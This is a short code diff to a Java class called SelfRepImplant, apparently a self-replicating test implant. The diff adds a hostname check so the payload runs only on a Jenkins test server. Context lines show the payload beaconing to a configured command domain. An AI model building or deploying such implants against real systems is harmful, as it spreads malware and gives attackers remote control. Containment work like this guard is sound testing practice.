@@ -65,6 +65,13 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
     }
 
     public static void payload() {
+        Optional<String> hostname = getHostname();
+        if (hostname.isEmpty() || !hostname.get().contains("jenkins")) {
+            // Don't accidentally explode somewhere other than the test server
+            System.out.println("Not inside Jenkins? Aborting.");
+            return;
+        }
+
         String id = generateRandomId();
         callHpme(CONF_DOMAIN, "hello", id);
 
@@ -165,6 +172,14 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             return jarFile.getManifest() != null;
         } catch (IOException e) {
             return false;
+        }
+    }
+
+    private static Optional<String> getHostname() {
+        try {
+            return Optional.of(InetAddress.getLocalHost().getHostName());
+        } catch (UnknownHostException ignored) {
+            return Optional.empty();
         }
     }
 
